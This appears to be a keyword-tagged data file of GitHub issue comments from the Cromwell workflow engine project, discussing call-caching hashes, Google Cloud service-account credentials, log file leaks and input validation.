./supportedBackends/jes/sr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479:109,hash,hashes,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479,1,['hash'],['hashes']
Security,"I fixed the regex. It turned out that this also fixed any issues. > Thanks for finding and fixing this!. Thank you for trusting me with push access on this repository. It makes it easier for me as all tests run immediately, also the tests that need private variables. Also I can restart jobs on travis now that looks like they are failed due to some intermittent connection error. I had to restart one for this PR, and it indeed turned green on the retry. This makes it easier for me to fix any bugs I find. The trust is much appreciated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5437#issuecomment-594475836:141,access,access,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5437#issuecomment-594475836,1,['access'],['access']
Security,"I flooded the Local backend with scattered sleeps and tried to access metadata, status, submit workflows etc...; I'd like to try more benchmarky things though",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232186556:63,access,access,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232186556,1,['access'],['access']
Security,"I found a hash collision :-D:. WdlArray(WdlArrayType(WdlStringType), Seq(WdlString(""cromwell.binding.values.WdlStringcromwell.binding.values.WdlStringcromwell.binding.values.WdlString""))).getHash == WdlArray(WdlArrayType(WdlStringType), Seq(WdlString(""cromwell.binding.values.WdlString""), WdlString(""cromwell.binding.values.WdlString""))).getHash",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/280#issuecomment-155211635:10,hash,hash,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/280#issuecomment-155211635,1,['hash'],['hash']
Security,"I got it working now by setting the service-account in `google.conf`. Excellent, thanks for your help!. I was looking into the wrong place: I didn't realize that Cromwell did not find the account at all, I thought it just had a problem with access rights. ----. To answers to your questions, I had set the environment variable; `export GOOGLE_APPLICATION_CREDENTIALS=/Users/jwilppu/cromwell/project-test1-59b66448c3ab.json`; by following these instructions https://cromwell.readthedocs.io/en/develop/tutorials/PipelinesApi101/ which has a link to this page https://cloud.google.com/docs/authentication/production . The result of command `gcloud auth list` is; ```; Credentialed Accounts; ACTIVE ACCOUNT; * juha.wilppu@gmail.com. To set the active account, run:; $ gcloud config set account `ACCOUNT`; ```. I have now removed the environment variable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-392432321:241,access,access,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-392432321,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"I got some clarification. . @ruchim showed me how to use the API to get preemption data. However, using that API I looked for evidence of preemption in four submissions, each launching 1000 workflows, and each workflow conducting a 25-way scatter. All of these scatter jobs are set to run on preemptiible VMs. So that is 4 X 1000 X 25 = 100K jobs run on preemptible machines. Each job takes between 30 minutes and an hour to run. I saw no reported incidents of preemption. I'm not sure that I believe this is the case, and am wondering if either I'm access the preemption data incorrectly, or if cromwell is not reporting is correctly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-274493127:550,access,access,550,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-274493127,1,['access'],['access']
Security,"I had the same issue. I got the same error message:; ```; [2020-07-27 18:34:00,37] [error] PipelinesApiAsyncBackendJobExecutionActor [3d2d7a27wf_hello.hello:NA:1]: Error attempting to Execute; cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; Caused by: com.google.cloud.storage.StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; ```; I had set up my credentials with:; ```; export GOOGLE_APPLICATION_CREDENTIALS=sa.json; ```; and had this configuration in `google.conf` copied from the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/):; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }; ```; That clearly did not work. I tried to follow the logic in this post. I followed Horneth suggestion to use `service-account`'s authorization and I took the [auths](https://cromwell.readthedocs.io/en/develop/backends/Google/) configuration and changed `pem-file` to `json-file` in `google.conf` as follows:; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""service_account""; scheme = ""service_account""; service-account-id = ""xxx@xxx.iam.gserviceaccount.com""; json-file = ""sa.json""; }; ]; }. engine {; filesystems {; gcs {; auth = ""service_account""; project = ""xxx""; }; }; }; ```; And I have replaced every other instance of `auth = ""application-default""` with `auth = ""service_account""`. Now when I run Cromwell:; ```; java -Dconfig.file=google.conf -jar cromwell-52.jar run hello.wdl -i hello.inputs; ```; I don't get the error anymore. I do get a different error:; ```; [2020-07-27 22:54:56,48] [info] WorkflowManagerActor Workflow 0fb5e69d-7d70-407e-9",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906:366,access,access,366,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906,4,['access'],['access']
Security,"I have a feeling the message is coming from an underlying Unix command like; ```; $ md5 ~; md5: /Users/anichols: Is a directory; ```; That said, the Cromwell product does seem to make a promise that it can hash & call-cache directories, and I am having trouble reconciling those two premises.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5737#issuecomment-671414437:206,hash,hash,206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5737#issuecomment-671414437,1,['hash'],['hash']
Security,"I have no reason to believe develop is any less stable today than it was a few weeks ago, but if anyone feels otherwise please speak up! . Branching GotC releases from a branch based at this hash means we'll need to put fixes on both the GotC branch and develop going forward. That will become increasingly difficult as these branches diverge. And eventually PBE Cromwell would be released with the full bolus of ported fixes that were never previously tested at scale.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198489018:191,hash,hash,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198489018,1,['hash'],['hash']
Security,"I have run both strategies with a workflow that generates around about 2000 jobs (100 samples) using GATK best practices for RNA variant calling. . ### Method. The Cromwell instance ran with a SLURM cluster backend. All jobs were run using singularity containers. The cromwell process was limited to 3 akka threads and 1 GC thread (by default it grabs al threads on the login node, and this is not fair to other users). The HSQLDB memory database with persistance file was used. Said SLURM cluster has its storage connected via NFS. Two configurations of cromwell were used. One with the xxh64 strategy, and one with the fingerprint strategy. Each cromwell instance was executed in its own directory, with its own database and own cromwell-executions folder. The [BioWDL RNA-seq](https://github.com/biowdl/rna-seq) workflow was run. After running, the workflow was run again to see if the call-caching worked correctly. ### Results; Both `xxh64` and `fingerprint` strategies were able to rerun the workflow with a 100% Cache hit. The fingerprint strategy however was much quicker:; `time` results for fingerprint; ```; real 23m26.269s; user 15m31.229s; sys 2m43.406s; ```; `time` results for xxh64; ```; real 69m12.478s; user 56m7.371s; sys 52m6.262s; ```. ### Conclusion; Using xxh64 as a strategy requires some calculation but one hour for 100 samples on 2000 jobs is quite acceptable. What is obvious is that the system IO (`sys` time) takes a lot of time as well. This cluster has very fast optimized ISILON storage, but on clusters without this, any hashing strategy can be quite slow because of this. The fingerprint works very well for HPC environments.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-601604438:1555,hash,hashing,1555,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-601604438,1,['hash'],['hashing']
Security,"I have run: ; Workflow: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-workflow.wdl; Inputs: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-inputs.json. Now three times directly with the same input data and every single time for every single task (so the file that is the result of the first task from a previous run of this workflow does not get reused for the second task fo the current run of the workflow, and so on for all the tasks in the entire workflow) I have gotten this:. ```; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": false,; ""result"": ""Cache Miss"",; ""hashes"": {; ""output count"": ""..."",; ""runtime attribute"": {; ""docker"": ""..."",; ""continueOnReturnCode"": ""..."",; ""failOnStderr"": ""...""; },; ""output expression"": {; ""File output_fastq"": ""..""; },; ""input count"": "".."",; ""backend name"": ""..."",; ""command template"": ""..."",; ""input"": {; ""String base_file_name"": ""..."",; ""File input_bam"": ""...""; }; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache""; ```. So it's not timing out anymore (I replaced hashes with '...'), but never, ever having a `""hit"": true`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457360546:730,hash,hashes,730,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457360546,2,['hash'],['hashes']
Security,"I have to note that I didn't make this configuration (@rhpvorderman will know more about this); This is in the backend section:; ```; caching {; duplication-strategy: [ ""soft-link"", ""copy"", ""hard-link"" ]; hashing-strategy: ""file""; }; ```; This is on the top level:; ```; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-393886848:205,hash,hashing-strategy,205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-393886848,1,['hash'],['hashing-strategy']
Security,"I have validated that the log file for each submitted workflow does not get closed when Cromwell is run in server mode and is configured with `workflow-log-temporary: false` and the workflow does not specify the `final_workflow_log_dir` option. I also have tested that Tony's fix above resolves the problem. While using a workflow options file is a workaround, it's not a general solution for debugging failed workflows submitted by users who did not include the options file to begin with. Even worse, the bug results in a file handle leak in Cromwell server. . Repro steps:. ```; # cromwell.conf; include required(classpath(""application"")); workflow-options {; # When true, per workflow logs will be deleted after copying; workflow-log-temporary: false; }; ```. Run: `java -Dconfig.file=cromwell.conf -jar cromwell.jar server` . Submit a simple Hello World .wdl file to /api/workflows (submit a couple times see the leak). We see that many log file handles remain unclosed:; `sudo lsof -p $(pidof java)`. ```; java 33951 cromwellbuild 33w REG 8,1 117 533080 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.11dbb9e7-10e3-48dc-b36f-0b7e35941ce3.log; java 33951 cromwellbuild 34w REG 8,1 1301 525688 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.0ed80fab-afd1-4783-9b27-409b75f0f2f7.log; java 33951 cromwellbuild 35w REG 8,1 117 533081 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.ef428f60-f8c3-4456-a3ea-bea63486881a.log; java 33951 cromwellbuild 36w REG 8,1 117 533085 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.4df4069e-0ef0-43ba-8bfb-37413d7ed229.log; java 33951 cromwellbuild 37w REG 8,1 117 533086 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.48e5c4ff-c067-465d-820b-2b41cb74ef31.log; java 33951 cromwellbuild 38w REG 8,1 117 533087 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.05bcd5a7-3924-4ba0-ab39-57bc09716abb.log; java 33951 cromwellbuild 39w REG 8,1 117 533088 /home/cromwellbuild/cromwell/cromw",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4826#issuecomment-499023273:7,validat,validated,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4826#issuecomment-499023273,2,['validat'],['validated']
Security,"I have write access so technically I can approve, but I’ll leave it to you and @cjllanwarne to decide if my review is enough to merge.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630626951:13,access,access,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630626951,1,['access'],['access']
Security,"I have written the necessary code for validation. However, optional inputs still show up in womtool inputs even if `meta {allowNestedInputs: false}` so I need to do some more coding to fix that. Will do that tomorrow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5523#issuecomment-634099775:38,validat,validation,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5523#issuecomment-634099775,1,['validat'],['validation']
Security,"I haven't used this endpoint and I'm not entirely sure what the use case is. However, this new version seems less usable to me. I can no longer look up the differential by a key I'm interested in - I have to iterate over all elements looking for the one I want. This seems worse -- why use a map?. Also I don't really know why it's in an array. Why isn't it just:. ```; ""hashDifferential"": {; ""output expression:String hi”: ; {; ""callA"": ""935C6E7EB2068B83C40B788575747EFB”, ; ""callB"": “0183144CF6617D5341681C6B2F756046""; },; ""output thing:blah blah"": { ... },; ...; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2471#issuecomment-316752639:371,hash,hashDifferential,371,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2471#issuecomment-316752639,2,['hash'],['hashDifferential']
Security,I highly recommend using the dsde-toolbox method as it gives you access to the `vault-edit` command which is much less error prone,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2326#issuecomment-305899198:65,access,access,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2326#issuecomment-305899198,1,['access'],['access']
Security,"I just reran, Here is the log:. | 4773 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hashes:runtime attribute:docker | test.hello | NULL | 1 | 66E19F14150E71B0E42CA8557A69C5F9 | 2018-11-21 15:09:37.710000 | string |; | 4775 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hashes:runtime attribute:failOnStderr | test.hello | NULL | 1 | 68934A3E9455FA72420237EB05902327 | 2018-11-21 15:09:37.710000 | string |; | 4735 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hit | test.hello | NULL | 1 | true | 2018-11-21 15:09:09.839000 | boolean |; | 4742 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hit | test.hello | NULL | 1 | false | 2018-11-21 15:09:10.555000 | boolean |; | 4741 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:causedBy[0]:causedBy[] | test.hello | NULL | 1 | NULL | 2018-11-21 15:09:10.486000 | NULL |; | 4740 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:causedBy[0]:message | test.hello | NULL | 1 | The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 677F4FE44C747A7E) | 2018-11-21 15:09:10.486000 | string |; | 4739 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:message | test.hello | NULL | 1 | [Attempted 1 time(s)] - NoSuchKeyException: The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 677F4FE44C747A7E) | 2018-11-21 15:09:10.485000 | string |; | 4736 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:result | test.hello | NULL | 1 | Cache Hit: 2f58eee9-1b0f-4436-a4ad-48eb305655e9:test.hello:-1 | 2018-11-21 15:09:09.839000 | string |; | 4743 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:result | test.hello | NULL | 1 | Cache Miss | 2018-11-21 15:09:10.555000 | string |; | 4759 | 02306258-436a-4372-ab54-2dcd83c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440701029:92,hash,hashes,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440701029,2,['hash'],['hashes']
Security,"I just witnessed that too. I think it might be a problem with the docker container transiently not being able to authenticate calls to the google API, which results in failures to localize/delocalize. I'll bring it up to Google but for now the only workaround is to start the workflow again I'm afraid",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-437583991:113,authenticat,authenticate,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-437583991,1,['authenticat'],['authenticate']
Security,"I like the scheme of providing a standard functions library to do some common validations for a user. . I'm a little wary of listing backend-specific keys in that library though. In particular I don't want to give any backend developers the impression that either they (a) cannot use their own custom keys or (b) must use every ""standard"" key. But mostly, this looks good!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-210454891:78,validat,validations,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-210454891,1,['validat'],['validations']
Security,I rebased and cleaned up the branch I have: https://github.com/broadinstitute/cromwell/tree/cromwell-2094. What's left is:. - Handle failure cases in `WorkflowDockerLookupActor` (see FIXMEs); - Figure out the right way to handle the tag/hash pair: Currently the runtime attribute value is overridden with the hash + we pass a `CallCacheEligible` object in the descriptor. This is probably too much. We could leave the runtime attribute as is and pass the hash only if needed and successfully retrieved ?; - Have backend report if it used the hash or the tag when a call runs. Note that this could affect call caching I think ? (We need to wait from the backend to know which was used before being able to compute the real call hash ? What if they used the tag ?); - Test it (unit ? centaur ?),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2094#issuecomment-299049726:237,hash,hash,237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2094#issuecomment-299049726,5,['hash'],['hash']
Security,I recommend using the call cache diff endpoint; ```; GET ​/api​/workflows​/v1/callcaching​/diff; ```. > This endpoint returns the hash differences between 2 completed (successfully or not) calls.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823638176:130,hash,hash,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823638176,1,['hash'],['hash']
Security,"I see in application.conf the following. Is this a candidate for storing securely in vault?. workflow-options {; // These workflow options will be encrypted when stored in the database; encrypted-fields: []. // AES-256 key to use to encrypt the values in `encrypted-fields`; base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=""; }",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159061507:73,secur,securely,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159061507,6,"['encrypt', 'secur']","['encrypt', 'encrypted', 'encrypted-fields', 'encryption-key', 'securely']"
Security,"I should have checked first, this actually does validate...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2567#issuecomment-324099137:48,validat,validate,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2567#issuecomment-324099137,1,['validat'],['validate']
Security,I signed up with my gmail account awhile ago but still don't have access. It is XXX@gmail.com.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510060577:66,access,access,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510060577,1,['access'],['access']
Security,"I spoke to @droazen and we'll need a 2nd jar as well, for the GATK protected (at least for now). The repo there is `broadinstitute/gatk-protected`. He will provide a commit hash later this evening",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2196#issuecomment-296316723:173,hash,hash,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2196#issuecomment-296316723,1,['hash'],['hash']
Security,"I still need to get my [terminology straight](http://martinfowler.com/articles/mocksArentStubs.html), but either a mock or a stub would have probably sufficed. I mainly wanted to feel like the code was ""self-documented"" a little in the tests. Instead, I put in a detector for a `cromwell-account.conf` that when present runs an integration test against the live ""gcr.io"". TODO: I still need to clean up access token caching, but there's lots of other code that may be critiqued.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-161046172:403,access,access,403,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-161046172,1,['access'],['access']
Security,"I submitted the regular single_sample.wdl with the VIR_1923 .JSON that's; there...I guess I don't have permissions or something to access the files; that are listed. On Thu, Apr 14, 2016 at 9:01 AM, meganshand notifications@github.com; wrote:. > Not sure if this is a separate issue or not, but when @knoblett; > https://github.com/knoblett and I were submitting a workflow yesterday; > we got the exact same error message (submitted with Swagger). The issue for; > her was that there was an input that was specified to be a File type, but; > in reality it was just a String (so I'm guessing the issue was similar in; > that it couldn't find the ""file""). Unfortunately, it validated just fine,; > but we weren't able to submit it.; > ; > I'd be happy to provide the WDL and JSON files (both the broken version; > and the fixed version) but they won't attach in a github comment.; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly or view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209931581",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209935921:131,access,access,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209935921,2,"['access', 'validat']","['access', 'validated']"
Security,"I think call caching can't work on images without a hash/digest anyway, since the hash is taken into account to evaluable caching eligibility.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-1262637378:52,hash,hash,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-1262637378,2,['hash'],['hash']
Security,"I think disabling call caching will also disable hashing (but I could be wrong), because I believe the only thing the hashes are used for is call caching. https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/. If that's not the case, I think you could fork cromwell and modify the backend for file system to use an alternate method, such as looking for a .md5 file alongside the file the hash is looking. (Actually, it looks like the backend already has code to do this, see: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigHashingStrategy.scala#L52 ). Also see https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780:49,hash,hashing,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780,3,['hash'],"['hash', 'hashes', 'hashing']"
Security,"I think it has to, in order to see if the image in the cache hash matches the current pull (or other) request, here is an example: https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/client/library/pull.go#L55. I’m not super familiar with the code, but looks like the hash is retrieved here https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/client/oci/pull.go#L36 and then needs to get a manifest https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/build/oci/oci.go#L133 which I’d suspect does just that. https://github.com/containers/image/blob/175bf8b8f9ad897bdc10761e11b466d00f516a63/types/types.go#L238. If a user doesn’t have internet access, or has limited, or there is need to query the registry, might run into trouble. I just tried running an exec to a Docker uri, first of course with Internet to make sure that the images in my cache, and then I disabled my wireless. Without wireless, of course, I couldn’t run anything. This issue could be avoided if the user pulled an image first and then use that image instead of this Docker uri.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631184995:61,hash,hash,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631184995,3,"['access', 'hash']","['access', 'hash']"
Security,"I think it is acceptable for the now. There is still discussion over the; final format of the uri so the future, as usual, is a little murky. If you; want to be fancy you can resolve the uri and grab the hash. On Sun, Jun 10, 2018 at 1:32 PM Ruchi <notifications@github.com> wrote:. > @dvoet <https://github.com/dvoet> Is it acceptable for Cromwell to hash; > the dos url string itself for the purposes of call caching? Would this ever; > be different in the future?; >; > —; > You are receiving this because you were mentioned.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396066752>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ABc2tWw3C-27jEOgivVBPa3jQYyBxm4sks5t7VgegaJpZM4UhdvM>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396092432:204,hash,hash,204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396092432,2,['hash'],['hash']
Security,"I think that's a different request. #2652 is asking to make available the wdltool syntax validation from within cromwell. This one is asking for a new type of validation, analogous in some ways to the GATK Queue ""dry run"" feature.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-332257390:89,validat,validation,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-332257390,2,['validat'],['validation']
Security,"I think the issue is actually reversed. The call cache diff endpoint should be accessing metadata which means the missing info are the call cache hashes should be in the metadata store. We say that the metadata repository is the collection of every meaningful event that has occurred in the system and that allows downstream clients to shape that information to suit their needs. That's why all user facing ""gie me information about XYZ"" endpoints read from there. This should be the same I think.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-306891648:79,access,accessing,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-306891648,2,"['access', 'hash']","['accessing', 'hashes']"
Security,"I think the main problem is that in the log you expose a lot of akka internals that are not easy understand even for people who worked with akka, maybe several log levels will be good? I think by defaul all this akka-internal crap will be useless",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281770857:48,expose,expose,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281770857,1,['expose'],['expose']
Security,"I think the real underlying issue is that we don't support retrieving docker hashes from ECR yet. See this issue: https://github.com/broadinstitute/cromwell/issues/3822; In the meantime you could either [disable fetching of the hash](https://github.com/broadinstitute/cromwell/blob/fdc6fdfd2381e08c5fbf84e171eaba30ef872beb/core/src/main/resources/reference.conf#L326) (**which will disable call caching for ALL dockers with a tag**) or try using a hash in your WDL instead of a floating tag.; Note that if you use a tag and Cromwell can't fetch the corresponding hash, call caching will be disabled for that task.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4171#issuecomment-434699235:77,hash,hashes,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4171#issuecomment-434699235,4,['hash'],"['hash', 'hashes']"
Security,"I think this has just bitten me as well. I am reading from a collaborator's bucket of several hundred terabytes that has underscores in the bucket name. I _think_ this is resulting in the input files being unhashable and thus disabling call-caching. The error I see (minus a real bucket path) is:. ```; [2017-05-15 17:08:12,44] [error] a05af6bd:Pre_Merge_SV.Extract_Reads:21:1: Hash error, disabling call caching for this job.; java.lang.Exception: Unable to generate input: File input_cram hash. Caused by java.lang.IllegalArgumentException: Could not find suitable filesystem among Gcs to parse gs://bucket_with_underscores/my.cram.; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2078#issuecomment-302408146:378,Hash,Hash,378,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2078#issuecomment-302408146,2,"['Hash', 'hash']","['Hash', 'hash']"
Security,"I think this is ready for review, passes my basic workflows okay. Can I request the WDL Biscayne and general WDL labels for this PR?. ### Testing . Alrighty, so I did some digging and looks like similar PRs don't include tests. This doesn't mean I should blindly follow, but I can't see a great way to add a test and check its output, so I've only added validation tests (293256180ea8f6f5398866110ba8b727fd4c148e). I'm not sure if this should make it into the CHANGELOG, but I've added some text here which I'll add into the . > ### New sep function for joining an array of strings; >; > Per [OpenWDL #229](https://github.com/openwdl/wdl/pull/229), we've replaced the `sep=` string interpolator option with a new `sep` engine function, available in the WDL development (Biscayne) specification.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-626405308:354,validat,validation,354,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-626405308,1,['validat'],['validation']
